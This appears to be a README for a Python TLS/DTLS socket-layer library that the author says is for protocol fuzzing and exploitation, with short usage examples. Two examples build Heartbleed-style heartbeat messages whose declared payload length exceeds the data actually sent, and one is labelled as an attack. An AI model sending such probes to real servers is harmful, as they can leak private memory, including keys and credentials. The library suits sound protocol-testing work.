ssl_tls_socket_layers
=====================

ssl tls tcp udp layers for python sockets intended for messing with tls ssl protocol fields (fuzzing, exploitation, ...)


a general purpose TLS protocol layer implementation on top of python sockets.
no dependencies
built-in ASN1 decoding


work in progress...


TODO    
-----

	* proto description with class only.. no serialize/unserialize
	* [done] get rid of utils.serialize
	* move hexdump to layer
	* [done] allow cross proto manipulations
	    * [done] upper layer accesses lower layer to set own fields
	* only serialize once
	    * dirty bits? serialize on update or only on read op
	* [done] match protocol based on layer descriptions
	* ASN1 mutations
	* TLSRecord mutations.. fuzz**zz
    
    

 



Example
-----
 

	# example: layered TLS messages on top of ordinary sockets
	#
	tcp = TCP(ip="172.16.0.55", port=443, buffer=16*1024)	# response buffer
	
	# build extension list
	ext = TLSExtensionList(extensions=TLSExtension()/TLSServerNameList()+
	                            TLSExtension()/TLSSessionTicket(data='N'*15+"I"*15+'\x00\x20'+'T'*0x20))
	
	# build valid TLS 1.0 Record with TLS 1.1 Handshake
	#  + append extensions defined above
	#  + autocalculates all other fields
	p = TLSRecord(version=TLSRecord.PROTOCOL_TLS_1_0)/TLSHandshake(version=TLSRecord.PROTOCOL_TLS_1_1, extensions=ext)
	print tcp/Raw(data=p.serialize())
	
	#
	#
	# HeartBeat attack example
	print tcp/Raw(data=(TLSRecord(version=TLSRecord.PROTOCOL_TLS_1_1)/TLSHeartBeat(payload_length=0x4000)).serialize())
	#
	
	
	
Example 2
---------

	# example: DTLS client
	udp = UDP(ip="172.16.0.55", port=443, buffer=16*1024, timeout=0.5)

	p = DTLSRecord(sequence=2, content_type=DTLSRecord.CONTENT_TYPE_HEARTBEAT, length=1400+2)/TLSHeartBeat(payload='a', payload_length=1400)
	
	resp = udp/Raw(data=p.serialize())
	print "response: %d"%len(resp) if resp else 0 
	if (resp):
	   hexdump_squashed(resp)
	   
Exaple 3
--------

	# example: TLS Server
	
	tcp = TCP(ip="0.0.0.0", port=443, buffer=16*1024, mode='server')
	print "build packet"
	
	
	    
	
	ext = TLSExtensionList(extensions=TLSExtension()/TLSServerNameList()+
	                                TLSExtension()/TLSSessionTicket(data='N'*15+"I"*15+'\x00\x20'+'T'*0x20)+
	                                TLSExtension()/TLSHeartBeat.Handshake())
	
	# build server handshake
	version=TLSRecord.PROTOCOL_TLS_1_0
	server_hello = TLSRecord(version=version)/TLSHandshake(data=TLSServerHello(version=version,extensions=ext))
	certificate = TLSRecord(version=version)/TLSHandshake(data=TLSCertificate(certificates=TLSPropCertificate()+TLSPropCertificate()))
	ske = TLSRecord(version=version)/TLSHandshake(data=TLSServerKeyExchange())
	hello_done = TLSRecord(version=version)/TLSHandshake(data=TLSServerHelloDone(data='arg'))
	
	
	resp= tcp.recv(1024)  # wait for client
	
	
	print "<----",repr(TLSRecord(__raw=resp))
	resp = tcp/(server_hello+certificate+ske+hello_done)    
	resp= tcp.recv(1024)  # wait for client
	print "<---",repr(TLSRecord(__raw=resp))
	exit()
	
	
	
 	- tintin
